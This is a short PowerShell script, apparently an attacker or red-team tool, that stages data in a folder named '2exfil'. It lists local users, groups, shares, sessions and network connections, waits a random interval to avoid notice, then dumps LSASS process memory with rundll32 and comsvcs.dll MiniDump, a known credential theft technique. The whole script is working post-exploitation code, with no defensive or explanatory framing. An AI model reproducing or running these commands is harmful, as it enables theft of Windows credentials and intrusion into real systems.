mkdir c:\temp\2exfil
$Path = c:\temp\2exfil\AccountInfo.txt
$Path2 = c:\temp\2exfil\NetworkInfo.txt
net user >> $Path
net localgroup >> $Path
net group >> $Path
net use >> $Path
net share >> $Path  
net view >> $Path
net accounts >> $Path
Netstat -a >> $Path2

Start-Sleep (Get-Random -min 60 -max 120)

$P = get-process lsass |select -expand id
C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $P c:\temp\2exfil\dump.txt full
